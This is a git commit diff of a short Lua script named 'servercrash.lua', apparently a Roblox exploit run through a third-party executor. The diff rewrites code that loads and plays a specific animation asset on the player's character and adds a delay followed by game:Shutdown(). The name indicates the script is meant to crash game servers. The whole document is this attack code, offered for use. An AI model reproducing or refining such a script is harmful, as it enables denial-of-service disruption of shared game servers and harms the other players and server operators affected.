20d7234df1c72a4adff408d5134b0ca4af79da4a
Cr1tacl <152733429+Cr1tacl@users.noreply.github.com>
2024-05-28 15:50:58 -0700

    Update servercrash.lua

--- servercrash.lua
+++ servercrash.lua
@@ -1,13 +1,12 @@
-local Players = game:GetService("Players")
+local plrs = cloneref(game:GetService("Players"))
+local localplr = plrs.LocalPlayer
+local char = localplr.Character
+local hum = char:WaitForChild("Humanoid")
+        local anim = Instance.new("Animation", char)
+        anim.AnimationId = "rbxassetid://84315373"
 
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character
-local Humanoid = Character:WaitForChild("Humanoid")
+        local track = hum:LoadAnimation(anim)
+        track:Play()
 
-local Animation = Instance.new("Animation", Character)
-Animation.AnimationId = "rbxassetid://84315373"
-
-local Track = Humanoid:LoadAnimation(Animation)
-Track:Play()
-
---credit to johncrash
+        task.wait(3)
+        game:Shutdown()
